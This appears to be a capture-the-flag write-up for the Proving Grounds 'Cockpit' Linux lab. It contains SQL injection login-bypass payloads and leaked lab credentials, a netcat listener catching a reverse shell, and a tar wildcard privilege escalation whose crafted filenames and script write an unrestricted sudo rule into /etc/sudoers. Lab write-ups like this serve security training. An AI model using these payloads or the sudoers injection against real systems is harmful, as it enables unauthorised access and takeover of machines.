---
layout: default
title: Cockpit
parent: Proving Grounds Practice - Linux
nav_order: 14
---

# Scanning

---

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/cockpit]
└─$ sudo nmap -Pn -p- -sC -sV -T4 --open 192.168.180.10

PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)

80/tcp   open  http            Apache httpd 2.4.41 ((Ubuntu))
|_http-title: blaze
|_http-server-header: Apache/2.4.41 (Ubuntu)
9090/tcp open  ssl/zeus-admin?
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=blaze/organizationName=d2737565435f491e97f49bb5b34ba02e
| Subject Alternative Name: IP Address:127.0.0.1, DNS:localhost
| Not valid before: 2023-12-04T04:00:06
|_Not valid after:  2123-11-10T04:00:06
| fingerprint-strings:
|   GetRequest, HTTPOptions:
|     HTTP/1.1 400 Bad request
|     Content-Type: text/html; charset=utf8
|     Transfer-Encoding: chunked
|     X-DNS-Prefetch-Control: off
|     Referrer-Policy: no-referrer
|     X-Content-Type-Options: nosniff
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <title>
|     request
|     </title>
|     <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <style>
|     body {
|     margin: 0;
|     font-family: "RedHatDisplay", "Open Sans", Helvetica, Arial, sans-serif;
|     font-size: 12px;
|     line-height: 1.66666667;
|     color: #333333;
|     background-color: #f5f5f5;
|     border: 0;
|     vertical-align: middle;
|     font-weight: 300;
|     margin: 0 0 10px;
|_    @font-face {

```

# Enumeration

---

## 80 | HTTP

We get a login page

![login](../../../assets/images/ctfs/proving_grounds/cockpit/login.png)

Running Gobuster didn't provide anything useful.

Started SQLi attacks and this payload generated a "block"

```bash
' or 1=1 -- -
```

![block](../../../assets/images/ctfs/proving_grounds/cockpit/block.png)

I tried the following payloads and finally a bypass of authentication was successful

```bash
<username>' OR 1=1--
<username>'--
' union select 1, '<user-fieldname>', '<pass-fieldname>' 1--
'OR 1=1--

# This was successful
'OR '' = '	#Allows authentication without a valid username.
```

![password](../../../assets/images/ctfs/proving_grounds/cockpit/password.png)

```bash
Decoded creds

james:canttouchhhthiss@455152
cameron:thisscanttbetouchedd@455152
```

# Exploitation

---

I was able to use the _james_ user to authenticate to the Ubuntu server running on 9090

![terminal](../../../assets/images/ctfs/proving_grounds/cockpit/terminal.png)

I sent a reverse shell one-liner through the web terminal and received a reverse shell on the attack machine netcat listener

![shell](../../../assets/images/ctfs/proving_grounds/cockpit/shell.png)

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/cockpit]
└─$ nc -nlvp 9001
listening on [any] 9001 ...
connect to [192.168.45.217] from (UNKNOWN) [192.168.180.10] 55852
$ id
uid=1000(james) gid=1000(james) groups=1000(james)
```

# Post-Exploitation

---

## Check Sudo Permissions for James

```bash
james@blaze:/home$ sudo -l
sudo -l
Matching Defaults entries for james on blaze:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on blaze:
    (ALL) NOPASSWD: /usr/bin/tar -czvf /tmp/backup.tar.gz *

```

We can exploit this using the Tar Wildcard Exploit

Here is an writeup showing examples:

[Tar Wildcard Exploit Explanation with Example](https://www.sevenlayers.com/index.php/353-exploiting-tar-wildcards)

```bash
james@blaze:~$ echo 'echo "james ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers' > shell.sh

james@blaze:~$ chmod +x shell.sh

james@blaze:~$ echo "" > "--checkpoint-action=exec=sh shell.sh"

james@blaze:~$ echo "" > --checkpoint=1


```

Now that we have created the malicious shell script that will add our user to the Sudoers file we can execute the Sudo _tar_ command

```bash
james@blaze:~$ sudo /usr/bin/tar -czvf /tmp/backup.tar.gz *
sudo /usr/bin/tar -czvf /tmp/backup.tar.gz *
local.txt
shell.sh
```

Checking Sudo permissions again we can now see James can run any command

```bash
james@blaze:~$ sudo -l
sudo -l
Matching Defaults entries for james on blaze:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on blaze:
    (ALL) NOPASSWD: /usr/bin/tar -czvf /tmp/backup.tar.gz *
    (ALL) NOPASSWD: ALL

```

Now we can simply elevate our shell to root

```bash
james@blaze:~$ sudo /bin/bash
sudo /bin/bash
root@blaze:/home/james# id
id
uid=0(root) gid=0(root) groups=0(root)
root@blaze:/home/james# whoami
whoami
root

```
